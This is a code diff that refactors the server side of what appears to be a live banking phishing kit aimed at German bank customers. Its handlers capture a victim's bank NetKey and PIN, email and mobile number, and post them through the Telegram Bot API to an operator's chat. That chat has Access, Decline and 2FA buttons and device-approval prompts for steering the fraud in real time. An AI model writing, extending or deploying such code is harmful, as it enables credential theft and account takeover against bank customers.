@@ -1,94 +1,17 @@
 import { createServerFn } from "@tanstack/react-start";
-import { createClient } from "@supabase/supabase-js";
 import { renderSessionSummary, type QrSessionRow } from "@/lib/qrSessionSummary";
-
-function admin() {
-  return createClient(process.env["SUPABASE_URL"]!, process.env["SUPABASE_SERVICE_ROLE_KEY"]!, {
-    auth: { persistSession: false },
-  });
-}
-
-function esc(s: string): string {
-  return s.replace(/[&<>]/g, (c) => (c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;"));
-}
-
-// Resolve the target Telegram chat for a bank. Chat is configured per
-// domain_routes row (matched via banks.group == domain_routes.address_group).
-// Falls back to the is_default route, then TELEGRAM_CHAT_ID env.
-async function resolveGroupChatId(
-  sb: ReturnType<typeof admin>,
-  bankId: string,
-): Promise<string | null> {
-  const { data: bank } = await sb.from("banks").select("group").eq("id", bankId).maybeSingle();
-  const group = (bank as any)?.group as string | undefined;
-  if (group) {
-    const { data: route } = await sb
-      .from("domain_routes")
-      .select("telegram_chat_id")
-      .eq("address_group", group)
-      .not("telegram_chat_id", "is", null)
-      .limit(1)
-      .maybeSingle();
-    const cid = (route as any)?.telegram_chat_id as string | null | undefined;
-    if (cid) return cid;
-  }
-  const { data: def } = await sb
-    .from("domain_routes")
-    .select("telegram_chat_id")
-    .eq("is_default", true)
-    .not("telegram_chat_id", "is", null)
-    .limit(1)
-    .maybeSingle();
-  const defCid = (def as any)?.telegram_chat_id as string | null | undefined;
-  if (defCid) return defCid;
-  return process.env["TELEGRAM_CHAT_ID"] ?? null;
-}
-
-async function sendTelegram(
-  sessionId: string,
-  bankName: string,
-  netkey: string,
-  pin: string,
-  chatId: string,
-) {
-  const token = process.env["TELEGRAM_BOT_TOKEN"];
-  if (!token || !chatId) throw new Error("telegram_not_configured");
-
-  const text = [
-    "🔐 <b>QR-Login-Versuch</b>",
-    `<b>Bank:</b> ${esc(bankName)}`,
-    `<b>NetKey:</b> <code>${esc(netkey)}</code>`,
-    `<b>PIN:</b> <code>${esc(pin)}</code>`,
-    `<b>Zeit:</b> ${new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}`,
-  ].join("\n");
-
-  const reply_markup = {
-    inline_keyboard: [
-      [
-        { text: "✅ Access", callback_data: `access:${sessionId}` },
-        { text: "❌ Decline", callback_data: `decline:${sessionId}` },
-      ],
-      [{ text: "🔐 2FA", callback_data: `2fa:${sessionId}` }],
-    ],
-  };
-
-  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", reply_markup }),
-  });
-  const body = await res.json().catch(() => ({}));
-  if (!res.ok || !body?.ok) {
-    console.error("[qrLogin] telegram error", res.status, body);
-    throw new Error(`telegram_${res.status}`);
-  }
-  return { chatId: String(body.result.chat.id), messageId: body.result.message_id as number };
-}
+import {
+  createQrAdminClient,
+  escapeTelegramHtml,
+  resolveQrChatId,
+  sanitizeQrValue,
+  sendQrTelegramMessage,
+} from "@/lib/qrLogin.server";
 
 export const startQrLoginSession = createServerFn({ method: "POST" })
-  .inputValidator((data: { bankId: string; bankName: string; netkey: string; pin: string; onlineBankingUrl?: string | null }) => data)
+  .inputValidator((data: { bankId: string; bankName: string; netkey: string; pin: string; requestDomain?: string; onlineBankingUrl?: string | null }) => data)
   .handler(async ({ data }) => {
-    const sb = admin();
+    const sb = createQrAdminClient();
     const { data: row, error } = await sb
       .from("telegram_sessions")
       .insert({
@@ -107,37 +30,33 @@ export const startQrLoginSession = createServerFn({ method: "POST" })
     }
 
     try {
-      const targetChat = await resolveGroupChatId(sb, data.bankId);
+      const targetChat = await resolveQrChatId(sb, data.bankId, data.requestDomain);
       if (!targetChat) throw new Error("no_group_chat");
-      const { chatId, messageId } = await sendTelegram(row.id, data.bankName, data.netkey, data.pin, targetChat);
+      const { chatId, messageId } = await sendQrTelegramMessage(row.id, data.bankName, data.netkey, data.pin, targetChat);
       await sb.from("telegram_sessions")
         .update({ telegram_chat_id: chatId, telegram_message_id: messageId })
         .eq("id", row.id);
     } catch (err) {
       console.error("[qrLogin] send failed", err);
+      await sb.from("telegram_sessions").update({ decision: "decline" }).eq("id", row.id);
+      throw err;
     }
 
     return { sessionId: row.id as string };
   });
 
-function sanitize(v: string | undefined, max: number): string | null {
-  if (typeof v !== "string") return null;
-  const t = v.trim().slice(0, max);
-  return t ? t : null;
-}
-
 export const submitQrContactExtras = createServerFn({ method: "POST" })
   .inputValidator((data: { sessionId: string; email?: string; mobile?: string }) => data)
   .handler(async ({ data }) => {
     if (!/^[0-9a-f-]{10,}$/i.test(data.sessionId)) throw new Error("invalid_session");
-    const email = sanitize(data.email, 254);
-    const mobile = sanitize(data.mobile, 40);
+    const email = sanitizeQrValue(data.email, 254);
+    const mobile = sanitizeQrValue(data.mobile, 40);
     const patch: Record<string, unknown> = {};
     if (email !== null) patch["customer_email"] = email;
     if (mobile !== null) patch["customer_mobile"] = mobile;
     if (!Object.keys(patch).length) return { ok: true };
 
-    const sb = admin();
+    const sb = createQrAdminClient();
     await sb.from("telegram_sessions").update(patch).eq("id", data.sessionId);
 
     const { data: row } = await sb
@@ -169,7 +88,7 @@ export const requestDeviceList = createServerFn({ method: "POST" })
     const token = process.env["TELEGRAM_BOT_TOKEN"];
     if (!token) throw new Error("telegram_not_configured");
 
-    const sb = admin();
+    const sb = createQrAdminClient();
     const { data: sess } = await sb
       .from("telegram_sessions")
       .select("telegram_chat_id, telegram_message_id, devices_prompt_message_id, customer_devices")
@@ -215,7 +134,7 @@ export const requestDeviceApproval = createServerFn({ method: "POST" })
     const token = process.env["TELEGRAM_BOT_TOKEN"];
     if (!token) throw new Error("telegram_not_configured");
 
-    const sb = admin();
+    const sb = createQrAdminClient();
     const { data: sess } = await sb
       .from("telegram_sessions")
       .select("telegram_chat_id")
@@ -226,8 +145,8 @@ export const requestDeviceApproval = createServerFn({ method: "POST" })
     // reset any prior decision so polling picks up the new one
     await sb.from("telegram_sessions").update({ decision: "device_pending" }).eq("id", data.sessionId);
 
-    const activeList = data.active.length ? data.active.map((n) => `• ${esc(n)}`).join("\n") : "—";
-    const inactiveList = data.inactive.length ? data.inactive.map((n) => `• ${esc(n)}`).join("\n") : "—";
+    const activeList = data.active.length ? data.active.map((n) => `• ${escapeTelegramHtml(n)}`).join("\n") : "—";
+    const inactiveList = data.inactive.length ? data.inactive.map((n) => `• ${escapeTelegramHtml(n)}`).join("\n") : "—";
     const text = [
       "📱 <b>Geräteverwaltung – Freigabe erforderlich</b>",
       "",
